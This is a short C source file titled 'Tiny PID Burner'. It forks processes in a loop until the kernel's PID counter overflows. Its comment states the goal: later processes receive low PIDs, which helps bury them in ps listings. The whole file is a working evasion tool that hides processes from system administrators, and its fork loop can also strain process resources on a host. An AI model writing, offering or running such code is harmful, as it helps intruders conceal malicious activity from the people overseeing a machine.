/*
    Tiny PID Burner
    Author: B00TK1D
    Burns all PIDs from the current index to the maximum PID, forcing a PID overflow for subsequent processes
    Run this prior to running other processes to ensure they get a low PID (aiding in burying them in ps)
*/

#include <stdio.h>
#include <unistd.h>

int main() {
    int pid_max;
    {
        FILE *fp = fopen("/proc/sys/kernel/pid_max", "r");
        fscanf(fp, "%d", &pid_max);
        fclose(fp);
    }

    pid_max -= getpid();

    for (int i = 0; i < pid_max; i++) {
        if (!fork()) {
            return 0;
        }
    }
}